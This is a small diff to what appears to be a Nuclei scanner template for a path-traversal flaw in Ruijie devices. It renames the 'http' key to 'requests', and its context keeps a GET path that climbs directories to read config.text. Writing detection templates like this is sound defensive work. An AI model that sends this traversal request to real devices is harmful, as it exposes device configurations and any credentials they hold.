@@ -13,7 +13,7 @@ info:
     cwe-id: CWE-22
   tags: ruijie,lfi,edb
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/download.do?file=../../../../config.text"
